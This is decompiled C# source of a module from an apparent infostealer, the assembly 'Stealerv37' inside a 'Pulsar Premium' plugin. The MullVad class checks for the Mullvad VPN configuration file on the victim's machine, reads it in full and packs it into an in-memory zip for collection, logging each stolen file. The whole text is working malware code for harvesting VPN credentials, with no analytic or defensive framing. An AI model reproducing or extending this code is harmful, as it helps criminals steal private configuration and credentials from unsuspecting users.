// Decompiled with JetBrains decompiler
// Type: Intelix.Targets.Vpn.MullVad
// Assembly: Stealerv37, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: D491006B-B4AE-4407-B02D-3CC101716992
// Assembly location: C:\Users\Administrator\Downloads\Pulsar Premium v2.4.5\Plugins\Stealer.Client.dll

using Intelix.Helper.Data;
using System.IO;

#nullable disable
namespace Intelix.Targets.Vpn;

public class MullVad : ITarget
{
  public void Collect(InMemoryZip zip, Counter counter)
  {
    string path = "C:\\Program Files\\Mullvad VPN\\Configs\\Mullvad";
    if (!File.Exists(path))
      return;
    string path1 = "Mullvad";
    Counter.CounterApplications counterApplications = new Counter.CounterApplications();
    counterApplications.Name = "Mullvad";
    zip.AddFile(Path.Combine(path1, Path.GetFileName(path)), File.ReadAllBytes(path));
    counterApplications.Files.Add($"{path} => {path1}");
    counterApplications.Files.Add(path1);
    counter.Vpns.Add(counterApplications);
  }
}
